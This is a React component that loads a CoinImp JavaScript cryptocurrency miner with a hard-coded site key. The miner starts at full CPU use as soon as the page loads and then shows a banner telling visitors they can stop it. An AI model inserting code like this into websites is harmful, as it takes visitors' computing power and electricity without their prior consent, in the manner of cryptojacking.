import React, { useEffect, useState } from 'react';

function MiningComponent() {
  const [miningStatus, setMiningStatus] = useState('Mining is not running'); // Initial status message
  const [minerIsRunning, setMinerIsRunning] = useState(false); // Initial status message
  console.log('minerIsRunning', minerIsRunning);
  const [clientIsMobile, setClientIsMobile] = useState(false); // Initial status message

  useEffect(() => {
    var _client = new window.Client.Anonymous(
      'a38b16485ce3cf9855e5b4807feca82c62bc2dd71701819243b01f1e22364e12',
      {
        throttle: 0,
        c: 'w',
      }
    );

    // Check if mobile
    let isMobile = _client.isMobile();
    console.log('isMobile', isMobile);
    if (isMobile) {
      setClientIsMobile(isMobile);
    }

    // Start miner
    _client.start();

    // Bool isrunning
    let running = _client.isRunning();
    console.log('running', running);
    if (running) {
      setMinerIsRunning(running);
    }

    // Advert
    _client.addMiningNotification(
      'Top',
      'This site is running JavaScript miner from coinimp.com. If it bothers you, you can stop it.',
      '#cccccc',
      40,
      '#3d3d3d'
    );
  }, []);

  return (
    <section className='grid outline outline-1 outline-black rounded-lg bg-pink-400 items-center justify-center'>
      mine
      <section>
        {minerIsRunning ? <div>RUNNING YES</div> : <div>NO FALSE BAD</div>}
      </section>
      <section>
        {clientIsMobile ? <div>MOBILE</div> : <div>PC LAPTOP</div>}
      </section>
    </section>
  );
}

export default MiningComponent;
